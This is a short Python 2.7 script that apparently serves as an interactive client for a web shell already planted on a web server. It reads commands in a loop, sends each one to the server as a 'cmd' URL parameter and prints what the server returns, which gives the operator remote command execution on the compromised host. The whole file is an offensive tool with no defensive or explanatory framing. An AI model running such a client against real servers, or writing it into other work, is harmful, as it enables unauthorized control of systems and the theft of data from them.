#!/usr/bin/python2.7

import urllib2
import sys

shell = sys.argv[1]
host = shell.split("/")[2]

while True:
	command = raw_input("shell@{0}>>".format(host))

	req1 = str("{0}?cmd={1}".format(shell, command)).replace(" ", "%20")
	request = urllib2.urlopen(req1) # send resquest to server
	print request.read() # server response